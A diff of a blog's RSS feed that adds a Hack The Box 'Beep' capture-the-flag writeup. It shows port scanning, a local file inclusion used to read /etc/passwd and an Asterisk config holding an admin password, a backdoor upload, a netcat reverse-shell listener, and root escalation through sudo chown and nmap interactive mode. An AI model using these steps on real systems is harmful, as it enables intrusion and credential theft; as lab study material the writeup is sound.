@@ -5,9 +5,206 @@
     <description></description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 08 Jan 2018 16:02:41 +0100</pubDate>
-    <lastBuildDate>Mon, 08 Jan 2018 16:02:41 +0100</lastBuildDate>
+    <pubDate>Wed, 10 Jan 2018 11:25:41 +0100</pubDate>
+    <lastBuildDate>Wed, 10 Jan 2018 11:25:41 +0100</lastBuildDate>
     <generator>Jekyll v3.6.2</generator>
+    
+      <item>
+        <title>Beep Writeup</title>
+        <description>&lt;p&gt;Hello,&lt;/p&gt;
+
+&lt;p&gt;this is my first writeup for Hack The Box platform, the machine was &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/5&quot;&gt;Beep&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s run nmap to see which services are running on the machine:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sT -sV -p 1-65535 10.10.10.7 -A
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-08 12:27 EST
+Nmap scan report for beep.localdomain (10.10.10.7)
+Host is up (0.087s latency).
+Not shown: 65519 closed ports
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
+25/tcp    open  smtp       Postfix smtpd
+80/tcp    open  http       Apache httpd 2.2.3
+110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+111/tcp   open  rpcbind    2 (RPC #100000)
+143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
+746/tcp   open  status     1 (RPC #100024)
+993/tcp   open  ssl/imap   Cyrus imapd
+995/tcp   open  pop3       Cyrus pop3d
+3306/tcp  open  mysql      MySQL (unauthorized)
+4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
+4445/tcp  open  upnotifyp?
+4559/tcp  open  hylafax    HylaFAX 4.3.10
+5038/tcp  open  asterisk   Asterisk Call Manager 1.1
+10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
+Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There were a lot of services.&lt;/p&gt;
+
+&lt;p&gt;On port 443 there was Apache with elastix:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-08-htb-beep/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By using dirsearch I enumerated it’s directories:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/usr/share/wordlists/SecLists/Discovery/Web_Content# dirsearch -u https://10.10.10.7/ -w raft-medium-directories.txt -e php,txt
+
+ _|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
+
+Extensions: php, txt | Threads: 10 | Wordlist size: 30005
+
+Error Log: /opt/dirsearch/logs/errors-18-01-08_15-16-00.log
+
+Target: https://10.10.10.7/
+
+[15:16:01] Starting: 
+[15:16:02] 301 -  309B  - /admin  -&amp;gt;  https://10.10.10.7/admin/
+[15:16:02] 301 -  310B  - /images  -&amp;gt;  https://10.10.10.7/images/
+[15:16:02] 301 -  311B  - /modules  -&amp;gt;  https://10.10.10.7/modules/
+[15:16:02] 301 -  310B  - /themes  -&amp;gt;  https://10.10.10.7/themes/
+[15:16:03] 301 -  308B  - /help  -&amp;gt;  https://10.10.10.7/help/
+[15:16:05] 301 -  307B  - /var  -&amp;gt;  https://10.10.10.7/var/
+[15:16:05] 301 -  308B  - /mail  -&amp;gt;  https://10.10.10.7/mail/
+[15:16:06] 301 -  310B  - /static  -&amp;gt;  https://10.10.10.7/static/
+[15:16:07] 301 -  308B  - /lang  -&amp;gt;  https://10.10.10.7/lang/
+[15:16:10] 301 -  308B  - /libs  -&amp;gt;  https://10.10.10.7/libs/
+[15:16:19] 301 -  309B  - /panel  -&amp;gt;  https://10.10.10.7/panel/
+[15:16:58] 301 -  311B  - /configs  -&amp;gt;  https://10.10.10.7/configs/
+[15:23:39] 301 -  314B  - /recordings  -&amp;gt;  https://10.10.10.7/recordings/
+[15:26:38] 301 -  313B  - /vtigercrm  -&amp;gt;  https://10.10.10.7/vtigercrm/
+[15:26:42] 200 -    2KB - /
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I found vtigercrm 5.1.0:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-08-htb-beep/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This version is vulnerable to LFI.
+With &lt;a href=&quot;https://github.com/dzonerzy/goWAPT&quot;&gt;goWAPT&lt;/a&gt; I enumerated all the files:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-08-htb-beep/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the /etc/passwd file we can see the user Fanis:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-08-htb-beep/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After some research on google about asterisk, I got the etc/asterisk/manager.conf file:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;
+; AMI - Asterisk Manager interface
+;
+; FreePBX needs this to be enabled. Note that if you enable it on a different IP, you need
+; to assure that this can't be reached from un-authorized hosts with the ACL settings (permit/deny).
+; Also, remember to configure non-default port or IP-addresses in amportal.conf.
+; 
+; The AMI connection is used both by the portal and the operator's panel in FreePBX.
+;
+; FreePBX assumes an AMI connection to localhost:5038 by default.
+;
+[general]
+enabled = yes
+port = 5038
+bindaddr = 0.0.0.0
+displayconnects=no ;only effects 1.6+
+
+[admin]
+secret = jEhdIekWmdjE
+deny=0.0.0.0/0.0.0.0
+permit=127.0.0.1/255.255.255.0
+read = system,call,log,verbose,command,agent,user,config,command,dtmf,reporting,cdr,dialplan,originate
+write = system,call,log,verbose,command,agent,user,config,command,dtmf,reporting,cdr,dialplan,originate
+
+#include manager_additional.conf
+#include manager_custom.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I used the credential admin:jEhdIekWmdjE contained in this file to log in Elastix, Vtigercrm and FreePBX.&lt;/p&gt;
+
+&lt;p&gt;After some research on Google, I was able to upload a backdoor by using this &lt;a href=&quot;https://www.exploit-db.com/exploits/38345/&quot;&gt;vulnerability&lt;/a&gt; in vtiger crm:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-08-htb-beep/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With python I got a reverse shell and the user flag:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/webshell# nc -lvp 80
+listening on [any] 80 ...
+connect to [10.10.14.6] from beep.localdomain [10.10.10.7] 46497
+sh: no job control in this shell
+sh-3.2$ ls
+logo.txt
+sale.jpeg
+vtiger-crm-logo.jpg
+webshell.php
+sh-3.2$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+bash-3.2$ cat /home/fanis/user.txt
+cat /home/fanis/user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There were different ways to get the root flag:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2$ sudo -l
+sudo -l
+Matching Defaults entries for asterisk on this host:
+    env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY&quot;
+
+User asterisk may run the following commands on this host:
+    (root) NOPASSWD: /sbin/shutdown
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/bin/yum
+    (root) NOPASSWD: /bin/touch
+    (root) NOPASSWD: /bin/chmod
+    (root) NOPASSWD: /bin/chown
+    (root) NOPASSWD: /sbin/service
+    (root) NOPASSWD: /sbin/init
+    (root) NOPASSWD: /usr/sbin/postmap
+    (root) NOPASSWD: /usr/sbin/postfix
+    (root) NOPASSWD: /usr/sbin/saslpasswd2
+    (root) NOPASSWD: /usr/sbin/hardware_detector
+    (root) NOPASSWD: /sbin/chkconfig
+    (root) NOPASSWD: /usr/sbin/elastix-helper
+bash-3.2$ sudo /bin/chown -r asterisk /root
+sudo /bin/chown -r asterisk /root
+/bin/chown: invalid option -- r
+Try `/bin/chown --help' for more information.
+bash-3.2$ sudo /bin/chown -R asterisk /root
+sudo /bin/chown -R asterisk /root
+bash-3.2$ cat /root/root.txt
+cat /root/root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2$ sudo nmap --interactive
+sudo nmap --interactive
+
+Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; for help
+nmap&amp;gt; !id
+!id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+waiting to reap child: No child processes (10)
+nmap&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bye!!!&lt;/p&gt;
+</description>
+        <pubDate>Sun, 07 Jan 2018 22:30:00 +0100</pubDate>
+        <link>http://localhost:4000/blog/htb-beep/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/htb-beep/</guid>
+        
+        <category>hackthebox</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
     
       <item>
         <title>Metasploitable3 CTF Writeup</title>
@@ -24,8 +221,6 @@
         <guid isPermaLink="true">http://localhost:4000/blog/metasploitable3-ctf/</guid>
         
         <category>metasploitable</category>
-        
-        <category>rapid7</category>
         
         
         <category>blog</category>
